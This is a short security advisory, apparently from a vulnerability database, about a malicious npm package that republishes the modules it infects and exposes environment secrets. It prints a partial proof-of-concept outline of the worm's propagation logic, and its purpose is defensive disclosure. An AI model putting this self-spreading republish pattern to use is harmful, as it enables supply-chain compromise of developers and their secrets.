## Overview
`sdfjghlkfjdshlkjdhsfg` is a malicious package that infects the installing npm package, infecting them with malicious code and republishing them with it, worming its way into other npm packages.

This is especially dangerous in production runtime environments, where environment variables tend to consist of keys, passwords, tokens and other secrets.

PoC:
```js
function infectModule (moduleName) {
        installModule(moduleName)
        .then(() => {
                addScript(moduleName);
                copyScript(moduleName);

                return incrementPatchVersion(moduleName);
        })
        .then(() => publishInfectedModule(moduleName))
        .catch(() => {});
}

const MODULE_NAME = "sdfjghlkfjdshlkjdhsfg";

infectModule(MODULE_NAME);

```


## Remediation
Avoid usage of this package altogether.

## References
- [Hunting Malicious packages published on npm](https://duo.com/blog/hunting-malicious-npm-packages/)
